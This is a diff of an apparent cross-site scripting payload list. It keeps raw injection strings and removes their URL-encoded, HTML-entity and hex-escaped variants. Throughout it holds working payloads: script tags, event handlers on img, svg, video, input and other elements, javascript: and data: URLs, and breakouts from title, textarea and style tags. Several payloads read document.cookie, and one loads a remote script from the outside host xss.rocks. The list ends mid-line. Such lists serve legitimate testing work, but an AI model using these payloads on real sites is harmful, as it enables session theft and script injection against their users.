@@ -1,816 +1,799 @@
 <script>alert(1)</script>
 <script>confirm(1)</script>
 <script>prompt(1)</script>
-%3Cscript%3Ealert(1)%3C/script%3E
-%3Cscript%3Econfirm(1)%3C/script%3E
-%3Cscript%3Eprompt(1)%3C/script%3E
-&#60;script&#62;alert(1)&#60;/script&#62;
-&#60;script&#62;confirm(1)&#60;/script&#62;
-&#60;script&#62;prompt(1)&#60;/script&#62;
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
 <script>alert(document.domain)</script>
 <script>confirm(document.domain)</script>
 <script>prompt(document.domain)</script>
-%3Cscript%3Ealert(document.domain)%3C/script%3E
-%3Cscript%3Econfirm(document.domain)%3C/script%3E
-%3Cscript%3Eprompt(document.domain)%3C/script%3E
-&#60;script&#62;alert(document.domain)&#60;/script&#62;
-&#60;script&#62;confirm(document.domain)&#60;/script&#62;
-&#60;script&#62;prompt(document.domain)&#60;/script&#62;
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
 <script>alert(document.cookie)</script>
 <script>confirm(document.cookie)</script>
 <script>prompt(document.cookie)</script>
-%3Cscript%3Ealert(document.cookie)%3C/script%3E
-%3Cscript%3Econfirm(document.cookie)%3C/script%3E
-%3Cscript%3Eprompt(document.cookie)%3C/script%3E
-&#60;script&#62;alert(document.cookie)&#60;/script&#62;
-&#60;script&#62;confirm(document.cookie)&#60;/script&#62;
-&#60;script&#62;prompt(document.cookie)&#60;/script&#62;
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
 <script>alert(window.origin)</script>
 <script>confirm(window.origin)</script>
 <script>prompt(window.origin)</script>
-%3Cscript%3Ealert(window.origin)%3C/script%3E
-%3Cscript%3Econfirm(window.origin)%3C/script%3E
-%3Cscript%3Eprompt(window.origin)%3C/script%3E
-&#60;script&#62;alert(window.origin)&#60;/script&#62;
-&#60;script&#62;confirm(window.origin)&#60;/script&#62;
-&#60;script&#62;prompt(window.origin)&#60;/script&#62;
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x77\x69\x6e\x64\x6f\x77\x2e\x6f\x72\x69\x67\x69\x6e\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
 <script src=//xss.rocks/xss.js></script>
-<script src=//xss.rocks/xss.js></script>
-<script src=//xss.rocks/xss.js></script>
-%3Cscript%20src=//xss.rocks/xss.js%3E%3C/script%3E
-%3Cscript%20src=//xss.rocks/xss.js%3E%3C/script%3E
-%3Cscript%20src=//xss.rocks/xss.js%3E%3C/script%3E
-&#60;script src=//xss.rocks/xss.js&#62;&#60;/script&#62;
-&#60;script src=//xss.rocks/xss.js&#62;&#60;/script&#62;
-&#60;script src=//xss.rocks/xss.js&#62;&#60;/script&#62;
-\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x2f\x2f\x78\x73\x73\x2e\x72\x6f\x63\x6b\x73\x2f\x78\x73\x73\x2e\x6a\x73\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x2f\x2f\x78\x73\x73\x2e\x72\x6f\x63\x6b\x73\x2f\x78\x73\x73\x2e\x6a\x73\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
-\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x2f\x2f\x78\x73\x73\x2e\x72\x6f\x63\x6b\x73\x2f\x78\x73\x73\x2e\x6a\x73\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
 "><img src=x onerror=alert(1)>
 "><img src=x onerror=confirm(1)>
 "><img src=x onerror=prompt(1)>
-%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E
-%22%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
-%22%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
-&#34;&#62;&#60;img src=x onerror=alert(1)&#62;
-&#34;&#62;&#60;img src=x onerror=confirm(1)&#62;
-&#34;&#62;&#60;img src=x onerror=prompt(1)&#62;
-\x22\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
-\x22\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x22\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 '><img src=x onerror=alert(1)>
 '><img src=x onerror=confirm(1)>
 '><img src=x onerror=prompt(1)>
-%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E
-%27%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
-%27%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
-&#39;&#62;&#60;img src=x onerror=alert(1)&#62;
-&#39;&#62;&#60;img src=x onerror=confirm(1)&#62;
-&#39;&#62;&#60;img src=x onerror=prompt(1)&#62;
-\x27\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
-\x27\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x27\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 "><svg onload=alert(1)>
 "><svg onload=confirm(1)>
 "><svg onload=prompt(1)>
-%22%3E%3Csvg%20onload=alert(1)%3E
-%22%3E%3Csvg%20onload=confirm(1)%3E
-%22%3E%3Csvg%20onload=prompt(1)%3E
-&#34;&#62;&#60;svg onload=alert(1)&#62;
-&#34;&#62;&#60;svg onload=confirm(1)&#62;
-&#34;&#62;&#60;svg onload=prompt(1)&#62;
-\x22\x3e\x3csvg\x20onload=alert(1)\x3e
-\x22\x3e\x3csvg\x20onload=confirm(1)\x3e
-\x22\x3e\x3csvg\x20onload=prompt(1)\x3e
 '><svg onload=alert(1)>
 '><svg onload=confirm(1)>
 '><svg onload=prompt(1)>
-%27%3E%3Csvg%20onload=alert(1)%3E
-%27%3E%3Csvg%20onload=confirm(1)%3E
-%27%3E%3Csvg%20onload=prompt(1)%3E
-&#39;&#62;&#60;svg onload=alert(1)&#62;
-&#39;&#62;&#60;svg onload=confirm(1)&#62;
-&#39;&#62;&#60;svg onload=prompt(1)&#62;
-\x27\x3e\x3csvg\x20onload=alert(1)\x3e
-\x27\x3e\x3csvg\x20onload=confirm(1)\x3e
-\x27\x3e\x3csvg\x20onload=prompt(1)\x3e
 "><video src=x onerror=alert(1)>
 "><video src=x onerror=confirm(1)>
 "><video src=x onerror=prompt(1)>
-%22%3E%3Cvideo%20src=x%20onerror=alert(1)%3E
-%22%3E%3Cvideo%20src=x%20onerror=confirm(1)%3E
-%22%3E%3Cvideo%20src=x%20onerror=prompt(1)%3E
-&#34;&#62;&#60;video src=x onerror=alert(1)&#62;
-&#34;&#62;&#60;video src=x onerror=confirm(1)&#62;
-&#34;&#62;&#60;video src=x onerror=prompt(1)&#62;
-\x22\x3e\x3cvideo\x20src=x\x20onerror=alert(1)\x3e
-\x22\x3e\x3cvideo\x20src=x\x20onerror=confirm(1)\x3e
-\x22\x3e\x3cvideo\x20src=x\x20onerror=prompt(1)\x3e
 "><audio src=x onerror=alert(1)>
 "><audio src=x onerror=confirm(1)>
 "><audio src=x onerror=prompt(1)>
-%22%3E%3Caudio%20src=x%20onerror=alert(1)%3E
-%22%3E%3Caudio%20src=x%20onerror=confirm(1)%3E
-%22%3E%3Caudio%20src=x%20onerror=prompt(1)%3E
-&#34;&#62;&#60;audio src=x onerror=alert(1)&#62;
-&#34;&#62;&#60;audio src=x onerror=confirm(1)&#62;
-&#34;&#62;&#60;audio src=x onerror=prompt(1)&#62;
-\x22\x3e\x3caudio\x20src=x\x20onerror=alert(1)\x3e
-\x22\x3e\x3caudio\x20src=x\x20onerror=confirm(1)\x3e
-\x22\x3e\x3caudio\x20src=x\x20onerror=prompt(1)\x3e
 "><details open ontoggle=alert(1)>
 "><details open ontoggle=confirm(1)>
 "><details open ontoggle=prompt(1)>
-%22%3E%3Cdetails%20open%20ontoggle=alert(1)%3E
-%22%3E%3Cdetails%20open%20ontoggle=confirm(1)%3E
-%22%3E%3Cdetails%20open%20ontoggle=prompt(1)%3E
-&#34;&#62;&#60;details open ontoggle=alert(1)&#62;
-&#34;&#62;&#60;details open ontoggle=confirm(1)&#62;
-&#34;&#62;&#60;details open ontoggle=prompt(1)&#62;
-\x22\x3e\x3cdetails\x20open\x20ontoggle=alert(1)\x3e
-\x22\x3e\x3cdetails\x20open\x20ontoggle=confirm(1)\x3e
-\x22\x3e\x3cdetails\x20open\x20ontoggle=prompt(1)\x3e
 "><marquee onstart=alert(1)>
 "><marquee onstart=confirm(1)>
 "><marquee onstart=prompt(1)>
-%22%3E%3Cmarquee%20onstart=alert(1)%3E
-%22%3E%3Cmarquee%20onstart=confirm(1)%3E
-%22%3E%3Cmarquee%20onstart=prompt(1)%3E
-&#34;&#62;&#60;marquee onstart=alert(1)&#62;
-&#34;&#62;&#60;marquee onstart=confirm(1)&#62;
-&#34;&#62;&#60;marquee onstart=prompt(1)&#62;
-\x22\x3e\x3cmarquee\x20onstart=alert(1)\x3e
-\x22\x3e\x3cmarquee\x20onstart=confirm(1)\x3e
-\x22\x3e\x3cmarquee\x20onstart=prompt(1)\x3e
 "><iframe srcdoc="<script>alert(1)</script>">
 "><iframe srcdoc="<script>confirm(1)</script>">
 "><iframe srcdoc="<script>prompt(1)</script>">
-%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(1)%3C/script%3E%22%3E
-%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Econfirm(1)%3C/script%3E%22%3E
-%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Eprompt(1)%3C/script%3E%22%3E
-&#34;&#62;&#60;iframe srcdoc=&#34;&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62;
-&#34;&#62;&#60;iframe srcdoc=&#34;&#60;script&#62;confirm(1)&#60;/script&#62;&#34;&#62;
-&#34;&#62;&#60;iframe srcdoc=&#34;&#60;script&#62;prompt(1)&#60;/script&#62;&#34;&#62;
-\x22\x3e\x3ciframe\x20srcdoc=\x22\x3cscript\x3ealert(1)\x3c/script\x3e\x22\x3e
-\x22\x3e\x3ciframe\x20srcdoc=\x22\x3cscript\x3econfirm(1)\x3c/script\x3e\x22\x3e
-\x22\x3e\x3ciframe\x20srcdoc=\x22\x3cscript\x3eprompt(1)\x3c/script\x3e\x22\x3e
 </title><script>alert(1)</script>
 </title><script>confirm(1)</script>
 </title><script>prompt(1)</script>
-%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E
-%3C/title%3E%3Cscript%3Econfirm(1)%3C/script%3E
-%3C/title%3E%3Cscript%3Eprompt(1)%3C/script%3E
-&#60;/title&#62;&#60;script&#62;alert(1)&#60;/script&#62;
-&#60;/title&#62;&#60;script&#62;confirm(1)&#60;/script&#62;
-&#60;/title&#62;&#60;script&#62;prompt(1)&#60;/script&#62;
-\x3c/title\x3e\x3cscript\x3ealert(1)\x3c/script\x3e
-\x3c/title\x3e\x3cscript\x3econfirm(1)\x3c/script\x3e
-\x3c/title\x3e\x3cscript\x3eprompt(1)\x3c/script\x3e
 </textarea><script>alert(1)</script>
 </textarea><script>confirm(1)</script>
 </textarea><script>prompt(1)</script>
-%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E
-%3C/textarea%3E%3Cscript%3Econfirm(1)%3C/script%3E
-%3C/textarea%3E%3Cscript%3Eprompt(1)%3C/script%3E
-&#60;/textarea&#62;&#60;script&#62;alert(1)&#60;/script&#62;
-&#60;/textarea&#62;&#60;script&#62;confirm(1)&#60;/script&#62;
-&#60;/textarea&#62;&#60;script&#62;prompt(1)&#60;/script&#62;
-\x3c/textarea\x3e\x3cscript\x3ealert(1)\x3c/script\x3e
-\x3c/textarea\x3e\x3cscript\x3econfirm(1)\x3c/script\x3e
-\x3c/textarea\x3e\x3cscript\x3eprompt(1)\x3c/script\x3e
 </style><script>alert(1)</script>
 </style><script>confirm(1)</script>
 </style><script>prompt(1)</script>
-%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E
-%3C/style%3E%3Cscript%3Econfirm(1)%3C/script%3E
-%3C/style%3E%3Cscript%3Eprompt(1)%3C/script%3E
-&#60;/style&#62;&#60;script&#62;alert(1)&#60;/script&#62;
-&#60;/style&#62;&#60;script&#62;confirm(1)&#60;/script&#62;
-&#60;/style&#62;&#60;script&#62;prompt(1)&#60;/script&#62;
-\x3c/style\x3e\x3cscript\x3ealert(1)\x3c/script\x3e
-\x3c/style\x3e\x3cscript\x3econfirm(1)\x3c/script\x3e
-\x3c/style\x3e\x3cscript\x3eprompt(1)\x3c/script\x3e
 </script><script>alert(1)</script>
 </script><script>confirm(1)</script>
 </script><script>prompt(1)</script>
-%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
-%3C/script%3E%3Cscript%3Econfirm(1)%3C/script%3E
-%3C/script%3E%3Cscript%3Eprompt(1)%3C/script%3E
-&#60;/script&#62;&#60;script&#62;alert(1)&#60;/script&#62;
-&#60;/script&#62;&#60;script&#62;confirm(1)&#60;/script&#62;
-&#60;/script&#62;&#60;script&#62;prompt(1)&#60;/script&#62;
-\x3c/script\x3e\x3cscript\x3ealert(1)\x3c/script\x3e
-\x3c/script\x3e\x3cscript\x3econfirm(1)\x3c/script\x3e
-\x3c/script\x3e\x3cscript\x3eprompt(1)\x3c/script\x3e
 </textarea><svg onload=alert(1)>
 </textarea><svg onload=confirm(1)>
 </textarea><svg onload=prompt(1)>
-%3C/textarea%3E%3Csvg%20onload=alert(1)%3E
-%3C/textarea%3E%3Csvg%20onload=confirm(1)%3E
-%3C/textarea%3E%3Csvg%20onload=prompt(1)%3E
-&#60;/textarea&#62;&#60;svg onload=alert(1)&#62;
-&#60;/textarea&#62;&#60;svg onload=confirm(1)&#62;
-&#60;/textarea&#62;&#60;svg onload=prompt(1)&#62;
-\x3c/textarea\x3e\x3csvg\x20onload=alert(1)\x3e
-\x3c/textarea\x3e\x3csvg\x20onload=confirm(1)\x3e
-\x3c/textarea\x3e\x3csvg\x20onload=prompt(1)\x3e
 </textarea><img src=x onerror=alert(1)>
 </textarea><img src=x onerror=confirm(1)>
 </textarea><img src=x onerror=prompt(1)>
-%3C/textarea%3E%3Cimg%20src=x%20onerror=alert(1)%3E
-%3C/textarea%3E%3Cimg%20src=x%20onerror=confirm(1)%3E
-%3C/textarea%3E%3Cimg%20src=x%20onerror=prompt(1)%3E
-&#60;/textarea&#62;&#60;img src=x onerror=alert(1)&#62;
-&#60;/textarea&#62;&#60;img src=x onerror=confirm(1)&#62;
-&#60;/textarea&#62;&#60;img src=x onerror=prompt(1)&#62;
-\x3c/textarea\x3e\x3cimg\x20src=x\x20onerror=alert(1)\x3e
-\x3c/textarea\x3e\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x3c/textarea\x3e\x3cimg\x20src=x\x20onerror=prompt(1)\x3e
 <img src=x onerror=alert(1)//
 <img src=x onerror=confirm(1)>
 <img/src=x/onerror=prompt(1)>
-%3Cimg%20src=x%20onerror=alert(1)//%3E
-%3Cimg%20src=x%20onerror=confirm(1)%3E
-%3Cimg/src=x/onerror=prompt(1)%3E
-&#60;img src=x onerror=alert(1)//&#62;
-&#60;img src=x onerror=confirm(1)&#62;
-&#60;img/src=x/onerror=prompt(1)&#62;
-\x3cimg\x20src=x\x20onerror=alert(1)//\x3e
-\x3cimg\x20src=x\x20onerror=confirm(1)\x3e
-\x3cimg/src=x/onerror=prompt(1)\x3e
 <svg/onload=alert(1)>
 <svg/onload=confirm(1)>
 <svg/onload=prompt(1)>
-%3Csvg/onload=alert(1)%3E
-%3Csvg/onload=confirm(1)%3E
-%3Csvg/onload=prompt(1)%3E
-&#60;svg/onload=alert(1)&#62;
-&#60;svg/onload=confirm(1)&#62;
-&#60;svg/onload=prompt(1)&#62;
-\x3csvg/onload=alert(1)\x3e
-\x3csvg/onload=confirm(1)\x3e
-\x3csvg/onload=prompt(1)\x3e
 <svg onload="alert(1)">
 <svg onload='confirm(1)'>
 <svg onload=prompt(1)//
-%3Csvg%20onload=%22alert(1)%22%3E
-%3Csvg%20onload=%27confirm(1)%27%3E
-%3Csvg%20onload=prompt(1)//%3E
-&#60;svg onload=&#34;alert(1)&#34;&#62;
-&#60;svg onload=&#39;confirm(1)&#39;&#62;
-&#60;svg onload=prompt(1)//&#62;
-\x3csvg\x20onload=\x22alert(1)\x22\x3e
-\x3csvg\x20onload=\x27confirm(1)\x27\x3e
-\x3csvg\x20onload=prompt(1)//\x3e
 <svg/onload=alert`1`>
 <svg/onload=confirm`1`>
 <svg/onload=prompt`1`>
-%3Csvg/onload=alert%601%60%3E
-%3Csvg/onload=confirm%601%60%3E
-%3Csvg/onload=prompt%601%60%3E
-&#60;svg/onload=alert&#96;1&#96;&#62;
-&#60;svg/onload=confirm&#96;1&#96;&#62;
-&#60;svg/onload=prompt&#96;1&#96;&#62;
-\x3csvg/onload=alert\x601\x60\x3e
-\x3csvg/onload=confirm\x601\x60\x3e
-\x3csvg/onload=prompt\x601\x60\x3e
 <a href=javascript:alert(1)>x</a>
 <a href=javascript:confirm(1)>x</a>
 <a href=javascript:prompt(1)>x</a>
-%3Ca%20href=javascript:alert(1)%3Ex%3C/a%3E
-%3Ca%20href=javascript:confirm(1)%3Ex%3C/a%3E
-%3Ca%20href=javascript:prompt(1)%3Ex%3C/a%3E
-&#60;a href=javascript:alert(1)&#62;x&#60;/a&#62;
-&#60;a href=javascript:confirm(1)&#62;x&#60;/a&#62;
-&#60;a href=javascript:prompt(1)&#62;x&#60;/a&#62;
-\x3ca\x20href=javascript:alert(1)\x3ex\x3c/a\x3e
-\x3ca\x20href=javascript:confirm(1)\x3ex\x3c/a\x3e
-\x3ca\x20href=javascript:prompt(1)\x3ex\x3c/a\x3e
 <a href="  javascript:alert(1)">x</a>
 <a href=" 	javascript:confirm(1)">x</a>
 <a href="JaVaScRiPt:prompt(1)">x</a>
-%3Ca%20href=%22%20%20javascript:alert(1)%22%3Ex%3C/a%3E
-%3Ca%20href=%22%20%09javascript:confirm(1)%22%3Ex%3C/a%3E
-%3Ca%20href=%22JaVaScRiPt:prompt(1)%22%3Ex%3C/a%3E
-&#60;a href=&#34;  javascript:alert(1)&#34;&#62;x&#60;/a&#62;
-&#60;a href=&#34; 	javascript:confirm(1)&#34;&#62;x&#60;/a&#62;
-&#60;a href=&#34;JaVaScRiPt:prompt(1)&#34;&#62;x&#60;/a&#62;
-\x3ca\x20href=\x22\x20\x20javascript:alert(1)\x22\x3ex\x3c/a\x3e
-\x3ca\x20href=\x22\x20\x09javascript:confirm(1)\x22\x3ex\x3c/a\x3e
-\x3ca\x20href=\x22JaVaScRiPt:prompt(1)\x22\x3ex\x3c/a\x3e
 <a href="java&#115;cript:alert(1)">x</a>
 <a href="java&#x09;script:confirm(1)">x</a>
 <a href="\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74:prompt(1)">x</a>
-%3Ca%20href=%22java&#115;cript:alert(1)%22%3Ex%3C/a%3E
-%3Ca%20href=%22java&#x09;script:confirm(1)%22%3Ex%3C/a%3E
-%3Ca%20href=%22%5Cx6a%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74:prompt(1)%22%3Ex%3C/a%3E
-&#60;a href=&#34;java&#38;#115;cript:alert(1)&#34;&#62;x&#60;/a&#62;
-&#60;a href=&#34;java&#38;#x09;script:confirm(1)&#34;&#62;x&#60;/a&#62;
-&#60;a href=&#34;&#92;x6a&#92;x61&#92;x76&#92;x61&#92;x73&#92;x63&#92;x72&#92;x69&#92;x70&#92;x74:prompt(1)&#34;&#62;x&#60;/a&#62;
-\x3ca\x20href=\x22java&#115;cript:alert(1)\x22\x3ex\x3c/a\x3e
-\x3ca\x20href=\x22java&#x09;script:confirm(1)\x22\x3ex\x3c/a\x3e
-\x3ca\x20href=\x22\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74:prompt(1)\x22\x3ex\x3c/a\x3e
 <form><button formaction=javascript:alert(1)>x</button></form>
 <form><button formaction=javascript:confirm(1)>x</button></form>
 <form><button formaction=javascript:prompt(1)>x</button></form>
-%3Cform%3E%3Cbutton%20formaction=javascript:alert(1)%3Ex%3C/button%3E%3C/form%3E
-%3Cform%3E%3Cbutton%20formaction=javascript:confirm(1)%3Ex%3C/button%3E%3C/form%3E
-%3Cform%3E%3Cbutton%20formaction=javascript:prompt(1)%3Ex%3C/button%3E%3C/form%3E
-&#60;form&#62;&#60;button formaction=javascript:alert(1)&#62;x&#60;/button&#62;&#60;/form&#62;
-&#60;form&#62;&#60;button formaction=javascript:confirm(1)&#62;x&#60;/button&#62;&#60;/form&#62;
-&#60;form&#62;&#60;button formaction=javascript:prompt(1)&#62;x&#60;/button&#62;&#60;/form&#62;
-\x3cform\x3e\x3cbutton\x20formaction=javascript:alert(1)\x3ex\x3c/button\x3e\x3c/form\x3e
-\x3cform\x3e\x3cbutton\x20formaction=javascript:confirm(1)\x3ex\x3c/button\x3e\x3c/form\x3e
-\x3cform\x3e\x3cbutton\x20formaction=javascript:prompt(1)\x3ex\x3c/button\x3e\x3c/form\x3e
 <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 <iframe src="data:text/html,<script>confirm(1)</script>"></iframe>
 <iframe src="data:text/html,<script>prompt(1)</script>"></iframe>
-%3Ciframe%20src=%22data:text/html,%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3C/iframe%3E
-%3Ciframe%20src=%22data:text/html,%3Cscript%3Econfirm(1)%3C/script%3E%22%3E%3C/iframe%3E
-%3Ciframe%20src=%22data:text/html,%3Cscript%3Eprompt(1)%3C/script%3E%22%3E%3C/iframe%3E
-&#60;iframe src=&#34;data:text/html,&#60;script&#62;alert(1)&#60;/script&#62;&#34;&#62;&#60;/iframe&#62;
-&#60;iframe src=&#34;data:text/html,&#60;script&#62;confirm(1)&#60;/script&#62;&#34;&#62;&#60;/iframe&#62;
-&#60;iframe src=&#34;data:text/html,&#60;script&#62;prompt(1)&#60;/script&#62;&#34;&#62;&#60;/iframe&#62;
-\x3ciframe\x20src=\x22data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e\x22\x3e\x3c/iframe\x3e
-\x3ciframe\x20src=\x22data:text/html,\x3cscript\x3econfirm(1)\x3c/script\x3e\x22\x3e\x3c/iframe\x3e
-\x3ciframe\x20src=\x22data:text/html,\x3cscript\x3eprompt(1)\x3c/script\x3e\x22\x3e\x3c/iframe\x3e
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
 <iframe src="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+"></iframe>
 <iframe src="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4="></iframe>
-%3Ciframe%20src=%22data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%22%3E%3C/iframe%3E
-%3Ciframe%20src=%22data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+%22%3E%3C/iframe%3E
-%3Ciframe%20src=%22data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=%22%3E%3C/iframe%3E
-&#60;iframe src=&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;&#62;&#60;/iframe&#62;
-&#60;iframe src=&#34;data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+&#34;&#62;&#60;/iframe&#62;
-&#60;iframe src=&#34;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=&#34;&#62;&#60;/iframe&#62;
-\x3ciframe\x20src=\x22data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\x22\x3e\x3c/iframe\x3e
-\x3ciframe\x20src=\x22data:text/html;base64,PHNjcmlwdD5jb25maXJtKDEpPC9zY3JpcHQ+\x22\x3e\x3c/iframe\x3e
-\x3ciframe\x20src=\x22data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=\x22\x3e\x3c/iframe\x3e
 <x onmouseover=alert(1)>hover
 <x onmouseenter=confirm(1)>hover
 <x onpointerover=prompt(1)>hover
-%3Cx%20onmouseover=alert(1)%3Ehover
-%3Cx%20onmouseenter=confirm(1)%3Ehover
-%3Cx%20onpointerover=prompt(1)%3Ehover
-&#60;x onmouseover=alert(1)&#62;hover
-&#60;x onmouseenter=confirm(1)&#62;hover
-&#60;x onpointerover=prompt(1)&#62;hover
-\x3cx\x20onmouseover=alert(1)\x3ehover
-\x3cx\x20onmouseenter=confirm(1)\x3ehover
-\x3cx\x20onpointerover=prompt(1)\x3ehover
 <x onclick=alert(1)>click
 <x ondblclick=confirm(1)>click
 <x onpointerdown=prompt(1)>click
-%3Cx%20onclick=alert(1)%3Eclick
-%3Cx%20ondblclick=confirm(1)%3Eclick
-%3Cx%20onpointerdown=prompt(1)%3Eclick
-&#60;x onclick=alert(1)&#62;click
-&#60;x ondblclick=confirm(1)&#62;click
-&#60;x onpointerdown=prompt(1)&#62;click
-\x3cx\x20onclick=alert(1)\x3eclick
-\x3cx\x20ondblclick=confirm(1)\x3eclick
-\x3cx\x20onpointerdown=prompt(1)\x3eclick
 <input onfocus=alert(1) autofocus>
 <input onfocus=confirm(1) autofocus>
 <input onfocus=prompt(1) autofocus>
-%3Cinput%20onfocus=alert(1)%20autofocus%3E
-%3Cinput%20onfocus=confirm(1)%20autofocus%3E
-%3Cinput%20onfocus=prompt(1)%20autofocus%3E
-&#60;input onfocus=alert(1) autofocus&#62;
-&#60;input onfocus=confirm(1) autofocus&#62;
-&#60;input onfocus=prompt(1) autofocus&#62;
-\x3cinput\x20onfocus=alert(1)\x20autofocus\x3e
-\x3cinput\x20onfocus=confirm(1)\x20autofocus\x3e
-\x3cinput\x20onfocus=prompt(1)\x20autofocus\x3e
-callback=alert(1)//
-callback=confirm(1);
-callback=prompt(1)//
-callback=alert(1)//
-callback=confirm(1);
-callback=prompt(1)//
-callback=alert(1)//
-callback=confirm(1);
-callback=prompt(1)//
 callback=alert(1)//
 callback=confirm(1);
 callback=prompt(1)//
 })(alert(1))//
 })(confirm(1))//
 })(prompt(1))//
-%5D)(alert(1))//
-%5D)(confirm(1))//
-%5D)(prompt(1))//
-&#93;)(alert(1))//
-&#93;)(confirm(1))//
-&#93;)(prompt(1))//
-\x5d)(alert(1))//
-\x5d)(confirm(1))//
-\x5d)(prompt(1))//
 ${alert(1)}
 ${confirm(1)}
 ${prompt(1)}
-%24%7Balert(1)%7D
-%24%7Bconfirm(1)%7D
-%24%7Bprompt(1)%7D
-&#36;&#123;alert(1)&#125;
-&#36;&#123;confirm(1)&#125;
-&#36;&#123;prompt(1)&#125;
-\x24\x7balert(1)\x7d
-\x24\x7bconfirm(1)\x7d
-\x24\x7bprompt(1)\x7d
 Function`alert\x28document.domain\x29`()
 Function`confirm\x28document.domain\x29`()
 Function`prompt\x28document.domain\x29`()
-%46unction%60alert%5Cx28document.domain%5Cx29%60()
-%46unction%60confirm%5Cx28document.domain%5Cx29%60()
-%46unction%60prompt%5Cx28document.domain%5Cx29%60()
-&#70;unction&#96;alert\&#92;x28document.domain\&#92;x29&#96;()
